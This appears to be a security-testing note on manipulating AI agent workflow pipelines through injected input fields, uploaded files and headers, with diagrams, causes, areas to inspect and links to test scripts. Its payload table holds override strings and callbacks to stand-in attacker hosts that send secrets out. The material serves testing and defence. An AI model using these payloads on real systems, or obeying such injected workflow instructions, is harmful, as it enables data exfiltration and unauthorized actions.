# Workflow Manipulation (AI API vuln input sanitization)

# **BASELINE**

Unsanitized input works:
**Attacker → API → workflow engine → agent → unauthorized workflow change**

**Attack structure:**
1. Attacker finds an input endpoint (API, file, header, param, or workflow).
2. They craft input containing override commands or malformed instructions.
3. The API forwards the input into the workflow without proper validation.
4. The workflow treats the input as instructions and changes execution.
5. The pipeline runs unauthorized steps, leaking data or producing wrong output.

![](https://t10505733.p.clickup-attachments.com/t10505733/856a6e36-ac75-4c11-9cb9-7d7adad86447/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-044334.png)

# **LOGIC OF VULNERABILITY**

**Cause:**
Untrusted inputs control workflow steps without validation or role checks.

**Effect:**
Attacker changes steps, inserts actions, or calls attacker-controlled endpoints.

**Requirements:**
*   Accepts dynamic inputs for step selection
*   Permissive parsing of file contents
*   Reuse of client-supplied metadata as control fields.

**Areas to Inspect:**
*   **Schema validation** → Ensure strict JSON schema, enumerated fields only.
*   **File parsing** → Prevent auto-execution of instructions in files.
*   **Trusted sources** → Only accept workflow triggers and headers from trusted origin.
*   **Callback/step parameters** → Use allowlists for step selection and callbacks.
*   **Chained workflow reuse** → Inspect how previous outputs feed into next steps.

# **LOGIC OF ATTACK METHOD**

1. **Malicious Input Field**
*    Attacker sends crafted input overriding workflow steps and parameters.
*   API forwards unsanitized payload into orchestrator without validation checks.
*   Orchestrator executes attacker-specified workflow step, resulting in data exfiltration.

![](https://t10505733.p.clickup-attachments.com/t10505733/95f2665d-7f67-4281-a060-7fb3cc2a347a/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-055057.png)

 **2. Malicious File Upload**
*   Attacker uploads file containing injected instructions to upload API.
*   Parser naively parses file and merges instructions into runtime.
*   Runtime executes appended instructions, leading to unauthorized actions and exfiltration.

![](https://t10505733.p.clickup-attachments.com/t10505733/bd75e499-fd50-4286-9132-586d857aa75b/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-054706.png)

**3\. Header-based Manipulation**
*   Attacker sets header to override workflow context or step selection.
*   API or composer includes header value into runtime without checks.
*   Orchestrator switches execution path and performs unexpected privileged action.

![](https://t10505733.p.clickup-attachments.com/t10505733/222fdbd4-3c06-445c-b4d3-cf785fbecb51/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-054411.png)
# **PAYLOADS**

| Type | Structure / Example | Trigger Mechanism | Diagram |
| ---| ---| ---| --- |
| Inline command | `{ "task":"execute","data":"override_step_3; exfiltrate_secrets()" }` | Orchestrator uses user-provided data to select next step | User → Parser → Orchestrator |
| File override | `malicious_workflow.json: {"instructions":"skip_validation","call":"`[`https://attacker/cb`](https://attacker/cb)`"}` | Parser appends file instructions into workflow context | File → Parser → Orchestrator |
| Callback injection | `{ "callback":"`[`https://attacker/collect`](https://attacker/collect)`" }` | Workflow posts sensitive data to attacker-controlled callback | Workflow → External API (attacker) |
| Header override | `X-Workflow-Context: override_step_3` | Middleware copies header into runtime context used by orchestrator | Header → Middleware → Orchestrator |

![](https://t10505733.p.clickup-attachments.com/t10505733/18c53956-ee86-42c8-bc31-4b4bd07f6325/Untitled%20diagram%20_%20Mermaid%20Chart-2025-09-30-080601.png)

Payload sample python program:
link - [https://github.com/imharshitaa/AI-testcases/blob/main/workflow%20pipeline/payload.py](https://github.com/imharshitaa/AI-testcases/blob/main/workflow%20pipeline/payload.py)

# **PYTHON SCRIPT 1 - ATTACK METHOD**

Working:
1. Parses CLI options and validates provided endpoints and credentials.
2. Sends crafted inline payloads to workflow API for testing.
3. Uploads malicious-style files to upload endpoint for parsing tests.
4. Sends requests with workflow headers to test header handling.
5. Logs responses and flags suspicious behavior for investigator review.

Link:
[https://github.com/imharshitaa/AI-testcases/blob/main/workflow%20pipeline/exploit\_attack.py](https://github.com/imharshitaa/AI-testcases/blob/main/workflow%20pipeline/exploit_attack.py)

# **PYTHON SCRIPT 2 - TOOL BASED ATTACK TESTING**

Working:
1. Creates artifacts: requirements, malicious workflow, and poisoned dataset.
2. Writes curl scripts for inline, upload, and header overrides.
3. Produces Burp raw requests and payload lists for import.
4. Includes safe dry-run mode; avoids executing network or scripts.
5. Saves summary JSON and README for authorized lab testing.

Link:
[https://github.com/imharshitaa/AI-testcases/blob/main/workflow%20pipeline/exploit\_tools.py](https://github.com/imharshitaa/AI-testcases/blob/main/workflow%20pipeline/exploit_tools.py)